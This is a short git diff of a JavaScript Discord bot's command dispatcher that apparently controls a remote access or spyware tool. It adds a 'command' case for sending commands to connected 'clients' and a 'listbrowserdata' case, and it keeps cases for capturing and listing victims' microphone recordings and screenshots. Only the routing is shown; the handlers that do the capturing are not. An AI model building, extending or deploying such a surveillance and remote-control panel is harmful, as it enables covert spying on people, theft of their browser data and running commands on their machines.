@@ -14,10 +14,9 @@ import {
     handleClientsCommand,
     handleHelpCommand,
     handleListAllScreenshotsCommand,
-    handleScreenshotCommand,
-    handleMicrophoneCommand,
     handleListAllMicrophonesCommand,
-    handleStopCommand
+    handleListBrowserDataCommand,
+    handleSendCommand, handleMicrophoneCommand
 } from "./utils/handleCommands.js";
 
 const { TOKEN, API_BASE_URL } = config;
@@ -36,8 +35,8 @@ client.on('interactionCreate', async interaction => {
             case 'help':
                 await handleHelpCommand(interaction);
                 break;
-            case 'screenshot':
-                await handleScreenshotCommand(interaction);
+            case 'command':
+                await handleSendCommand(interaction);
                 break;
             case 'microphone':
                 await handleMicrophoneCommand(interaction);
@@ -45,14 +44,14 @@ client.on('interactionCreate', async interaction => {
             case 'clients':
                 await handleClientsCommand(interaction);
                 break;
-            case 'stop':
-                await handleStopCommand(interaction);
-                break;
             case 'listallscreenshots':
                 await handleListAllScreenshotsCommand(interaction);
                 break;
             case 'listallmicrophones':
                 await handleListAllMicrophonesCommand(interaction);
+                break;
+            case 'listbrowserdata':
+                await handleListBrowserDataCommand(interaction);
                 break;
         }
     } else if (interaction.isButton()) {
